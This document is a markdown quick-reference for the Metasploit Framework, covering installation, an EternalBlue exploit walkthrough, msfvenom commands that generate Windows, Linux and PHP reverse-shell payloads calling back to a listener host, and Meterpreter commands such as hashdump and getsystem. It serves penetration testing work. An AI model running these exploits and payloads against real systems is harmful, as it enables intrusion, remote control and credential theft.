---
name: metasploit-framework
category: exploitation
tags:
  - exploitation
  - post-exploitation
  - payloads
  - meterpreter
  - penetration-testing
url: https://github.com/rapid7/metasploit-framework
docs: https://docs.metasploit.com/
last_updated: 2025-12-27
---

# Metasploit Framework

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Key Commands](#key-commands)
- [Documentation](#documentation)

## Overview

Metasploit Framework is the world's most widely used penetration testing framework. It provides:

- **Exploit modules**: 2000+ exploits for various platforms and services
- **Payload generation**: Shellcode, Meterpreter, and custom payloads via msfvenom
- **Post-exploitation**: Credential harvesting, pivoting, and privilege escalation
- **Auxiliary modules**: Scanners, fuzzers, and enumeration tools
- **Evasion modules**: AV bypass and payload obfuscation

## Installation

**Kali Linux** (pre-installed):
```bash
sudo msfdb init    # Initialize database
msfconsole         # Launch console
```

**Other Linux/macOS** (nightly installer):
```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall && ./msfinstall
```

**Docker**:
```bash
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

## Quick Start

### Basic Workflow

```bash
# 1. Start msfconsole
msfconsole

# 2. Search for modules
msf6> search type:exploit platform:windows smb

# 3. Select and configure module
msf6> use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue)> set RHOSTS 192.168.1.100
msf6 exploit(ms17_010_eternalblue)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(ms17_010_eternalblue)> set LHOST 192.168.1.50

# 4. Run exploit
msf6 exploit(ms17_010_eternalblue)> run
```

### Generate Payloads with msfvenom

```bash
# Windows reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf

# Web payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
```

### Multi-Handler Setup

```bash
msf6> use exploit/multi/handler
msf6 exploit(handler)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler)> set LHOST 0.0.0.0
msf6 exploit(handler)> set LPORT 4444
msf6 exploit(handler)> run -j    # Run as background job
```

## Key Commands

| Command | Description |
|---------|-------------|
| `search <term>` | Search modules by name, CVE, platform, or type |
| `use <module>` | Select a module to use |
| `info` | Display module information |
| `show options` | Show required/optional settings |
| `set <opt> <val>` | Set module option |
| `setg <opt> <val>` | Set global option (persists across modules) |
| `run` / `exploit` | Execute the module |
| `sessions` | List active sessions |
| `sessions -i <id>` | Interact with session |
| `background` | Background current session |
| `db_nmap` | Run nmap and import results |
| `hosts` / `services` | View discovered hosts/services |
| `creds` | View collected credentials |
| `route add` | Add pivot route through session |

### Meterpreter Commands

| Command | Description |
|---------|-------------|
| `sysinfo` | System information |
| `getuid` | Current user |
| `getsystem` | Attempt privilege escalation |
| `hashdump` | Dump password hashes |
| `upload/download` | Transfer files |
| `shell` | Drop to system shell |
| `migrate <pid>` | Migrate to another process |
| `portfwd` | Port forwarding |
| `run post/multi/recon/local_exploit_suggester` | Find local exploits |

## Documentation

| File | Description |
|------|-------------|
| [modules.md](modules.md) | Key modules reference with practical examples |
| [official_docs.md](official_docs.md) | Complete official documentation index |
| [wiki.md](wiki.md) | GitHub wiki page listing |

### External Resources

- [Official Documentation](https://docs.metasploit.com/)
- [API Documentation](https://docs.metasploit.com/api/)
- [Module Database](https://www.rapid7.com/db/)
- [GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [Slack Community](https://metasploit.com/slack)
